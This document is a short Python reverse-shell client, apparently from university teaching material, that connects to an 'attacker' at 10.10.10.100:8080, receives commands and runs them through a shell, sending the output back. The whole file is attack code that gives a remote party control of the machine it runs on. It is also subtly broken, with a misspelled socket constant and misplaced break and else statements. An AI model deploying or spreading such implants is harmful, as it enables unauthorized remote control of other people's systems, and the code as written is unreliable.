#!/usr/bin/pythonw

#========================================================
#title          :client-TCP-reverse-shell.py
#description    :client side reverse shell
#author:        :s.vidalis@herts.ac.uk
#timestamp      :201511172101Z
#version        :0.0.1
#usage          :python client-TCP-reverse-shell.py
#notes          :attacker at 10.10.10.100:8080
#========================================================

import socket		#for building tcp connection
import subprocess	#to start the shell in the system

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCL_STREAM)
	s.connect(('10.10.10.100', 8080))

	while True:	#keep receiving comms
		command = s.recv(1024)
		
		if 'terminate' in command:
			s.close()	#close the socket
		break
	else:
		CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		s.send( CMD.stdout.read() )	#send the result
		s.send( CMD.stderr.read() )	#in case you mistyped a command

def main():
	connect()

main()
